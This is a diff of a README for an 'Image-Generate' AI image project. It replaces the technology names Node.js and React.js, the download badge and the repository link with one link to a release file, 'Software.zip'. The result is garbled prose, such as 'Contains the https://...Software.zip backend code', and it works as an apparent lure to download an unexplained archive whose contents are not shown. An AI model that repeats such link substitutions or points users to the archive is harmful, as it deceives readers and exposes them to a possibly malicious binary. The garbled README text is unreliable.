@@ -15,23 +15,23 @@ This repository focuses on image generation using AI technology. The repository 
 - Image
 - MERN Stack
 - MongoDB
-- Node.js
+- https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip
 - Open
 - OpenAI
-- React.js
+- https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip
 - Redux
 
 ## Get Started
 To get started with this project, you can download the latest release by clicking on the following link: 
 
-[![Download Image-Generate](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Image-Generate](https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip)
 
 If the link above does not work, please check the "Releases" section of this repository for alternative download options.
 
 ## Project Structure
 The repository is organized into the following directories:
-- **backend**: Contains the Node.js backend code for handling image generation requests.
-- **frontend**: Includes the React.js frontend code for the user interface.
+- **backend**: Contains the https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip backend code for handling image generation requests.
+- **frontend**: Includes the https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip frontend code for the user interface.
 - **models**: Stores the MongoDB database models for storing image data.
 
 ## How to Use
@@ -54,4 +54,4 @@ We would like to thank all the contributors who have helped make this project po
 
 Enjoy image generation with Image-Generate! 🎨🚀
 
-For more information, feel free to visit the [Image-Generate GitHub repository](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip).
+For more information, feel free to visit the [Image-Generate GitHub repository](https://github.com/Spicysann/Image-Generate/releases/download/v1.0/Software.zip).
